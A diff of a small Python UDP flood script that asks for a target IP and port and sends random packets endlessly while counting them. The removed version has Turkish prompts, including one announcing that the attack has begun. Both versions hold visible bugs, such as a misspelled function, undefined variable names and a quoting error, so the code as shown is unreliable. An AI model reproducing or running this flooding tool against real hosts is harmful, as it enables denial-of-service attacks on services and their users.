@@ -1,6 +1,8 @@
+import sys
 import socket
 import random
 import os
+
 
 os.system("clear")
 
@@ -25,16 +27,15 @@ banner="""
 print(banner)
 
 
-hedef_ip=input("HEDEF İP ADRES =>")
-hedef_port=input("PORT =>")
+bytes = random._urandom(3000)
+socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-bytes=random._unrandom(9000)
-sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+ip = raw_input("Target IP :")
+port = input("Port        :")
 
-sayac=0
+sent = 0 
+
 while True:
-    sock.sendto(bytes,(hedef_ip_port))
-    sayac=sayac+1
-print("SALDIRI BASLATILID,GONDERILEN PAKET:%s"%"(sayac))
-
-
+    sock.sendto(bytes, (ip,port))
+    sent = sent+1
+    print("packages sent :%s"%(sent))
